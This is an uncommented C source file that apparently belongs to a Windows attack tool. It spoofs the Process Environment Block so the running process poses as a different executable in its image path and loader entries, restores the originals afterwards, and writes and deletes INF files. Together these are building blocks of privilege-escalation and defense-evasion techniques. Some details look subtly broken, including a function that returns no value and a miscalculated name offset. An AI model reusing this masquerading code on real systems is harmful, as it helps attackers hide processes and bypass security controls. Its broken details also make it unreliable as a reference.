#include "detail.h"

#include <intrin.h>

BOOLEAN detail_null_message_pump( )
{

}

BOOLEAN detail_spoof_peb( struct detail_spoof_data *data, const wchar_t *path, const wchar_t *file )
{
	const PEB *peb     = NtCurrentTeb( )->ProcessEnvironmentBlock;
	BOOLEAN    success = 0;

	RtlAcquirePebLock( );
	RtlEnterCriticalSection( peb->LoaderLock );

	__stosb( ( unsigned char * )data, 0, sizeof( *data ) );

	data->m_page_size = USN_PAGE_SIZE;
	const NTSTATUS s  = NtAllocateVirtualMemory( NtCurrentProcess( ),
												&data->m_page,
												0,
												&data->m_page_size,
												MEM_COMMIT | MEM_RESERVE,
												PAGE_READWRITE );
	if( NT_SUCCESS( s ) )
	{
		const size_t      len_path = lstrlenW( path ) * 2;
		const LIST_ENTRY *chain    = &peb->Ldr->InLoadOrderModuleList;

		__movsb( data->m_page, path, len_path );
		__movsb( ( ( char * )data->m_page ) + len_path, file, ( lstrlenW( file ) * 2 ) + 1 );
		__movsb( &data->m_backup_imagep, &peb->ProcessParameters->ImagePathName, sizeof( UNICODE_STRING ) );

		RtlInitUnicodeString( &peb->ProcessParameters->ImagePathName, ( wchar_t * )data->m_page );

		for( LIST_ENTRY *i = chain->Flink;
			 i != chain;
			 i = i->Flink )
		{
			LDR_DATA_TABLE_ENTRY* entry = ( LDR_DATA_TABLE_ENTRY* )i;

			if( entry->DllBase == peb->ImageBaseAddress )
			{
				__movsb( &data->m_backup_base_dllname, &entry->BaseDllName, sizeof( UNICODE_STRING ) );
				__movsb( &data->m_backup_full_dllname, &entry->FullDllName, sizeof( UNICODE_STRING ) );

				RtlInitUnicodeString( &entry->FullDllName, ( wchar_t* )data->m_page );
				RtlInitUnicodeString( &entry->BaseDllName, ( wchar_t* )( ( char * )data->m_page ) + len_path );

				data->m_backup_entry = entry;
				success              = 1;

				break;
			}
		}
	}

	RtlLeaveCriticalSection( peb->LoaderLock );
	RtlReleasePebLock( );

	return success;
}

void detail_restore_peb( struct detail_spoof_data *data )
{
	const PEB *peb = NtCurrentTeb( )->ProcessEnvironmentBlock;

	RtlAcquirePebLock( );
	RtlEnterCriticalSection( peb->LoaderLock );

	__movsb( &peb->ProcessParameters->ImagePathName, &data->m_backup_imagep,       sizeof( UNICODE_STRING ) );
	__movsb( &data->m_backup_entry->BaseDllName,     &data->m_backup_base_dllname, sizeof( UNICODE_STRING ) );
	__movsb( &data->m_backup_entry->FullDllName,     &data->m_backup_full_dllname, sizeof( UNICODE_STRING ) );

	data->m_page_size = 0;
	NtFreeVirtualMemory( NtCurrentProcess( ), &data->m_page, &data->m_page_size, MEM_RELEASE );

	RtlLeaveCriticalSection( peb->LoaderLock );
	RtlReleasePebLock( );
}

BOOLEAN detail_create_inf( const wchar_t *name, const char *buf, size_t size )
{
	HANDLE inf_file = CreateFileW( name, FILE_GENERIC_WRITE, FILE_SHARE_READ, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0 );
	BOOL   did_write = 0;

	if( inf_file != INVALID_HANDLE_VALUE ) {
		did_write = WriteFile( inf_file, buf, size, 0, 0 );
		CloseHandle( inf_file );
	}

	return did_write;
}

BOOLEAN detail_delete_inf( const wchar_t *name )
{
	return DeleteFileW( name );
}